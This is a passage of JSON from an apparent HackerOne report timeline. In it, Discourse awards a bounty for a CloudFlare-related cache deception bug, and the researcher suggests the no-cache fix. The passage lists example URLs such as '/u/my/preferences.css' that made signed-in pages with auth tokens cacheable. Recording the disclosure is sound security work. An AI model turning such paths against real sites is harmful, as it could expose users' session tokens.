then?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-31T23:27:31.070Z","updated_at":"2018-01-31T23:27:31.070Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2343125,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We agree this was effectively a bug, we should not be returning 200 OK plus auth tokens for random URLs such as\n\n```\n/u/my/preferences.css\n/u/my/preferences/username.css\n/u/my/preferences/card-badge.css\n```\n\nAlthough the impact is low (effectively CloudFlare specific) I am awarding at the medium level because this was such a well written and researched report -- thank you!\n\nThis is also fixed in master / latest.\n","markdown_message":"\u003cp\u003eWe agree this was effectively a bug, we should not be returning 200 OK plus auth tokens for random URLs such as\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/u/my/preferences.css\n/u/my/preferences/username.css\n/u/my/preferences/card-badge.css\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAlthough the impact is low (effectively CloudFlare specific) I am awarding at the medium level because this was such a well written and researched report -- thank you!\u003c/p\u003e\n\n\u003cp\u003eThis is also fixed in master / latest.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-01T21:29:02.981Z","updated_at":"2018-02-01T21:29:41.834Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Discourse"}},"bounty_amount":"256.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"discourse","collaborator":{"username":"fransrosen","url":"/fransrosen"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2343837,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Thank you!\nI haven't confirmed the fix yet but I have seen fixes been done by always serving Cache-Control: no-cache whenever the current user is signed in, as some cache settings in Cloudflare also allows caching 404 responses if no cache-header is present.\n\nGreat job, glad that it could get solved, sorry for the long delay of getting a proper PoC.","markdown_message":"\u003cp\u003eThank you!\u003cbr\u003e\nI haven\u0026#39;t confirmed the fix yet but I have seen fixes been done by always serving Cache-Control: no-cache whenever the current user is signed in, as some cache settings in Cloudflare also allows caching 404 responses if no cache-header is present.\u003c/p\u003e\n\n\u003cp\u003eGreat job, glad that it could get solved, sorry for the long delay of getting a proper PoC.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-02T04:28:31.142Z","updated_at":"2018-02-02T04:28:31.142Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2343918,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-02T06:11:25.477Z","updated_at":"2018-02-02T06:11:25.477Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"fransrosen","url":"/fransrosen"},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3019401,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-09T18:00:09.615Z","updated_at":"2018-07-09T18:00:09.615Z","first_to_agree":true,"actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3162622,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-08T18:00:12.277Z","updated_at":"2018-08-08T18:00:12.277Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Discourse"}},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}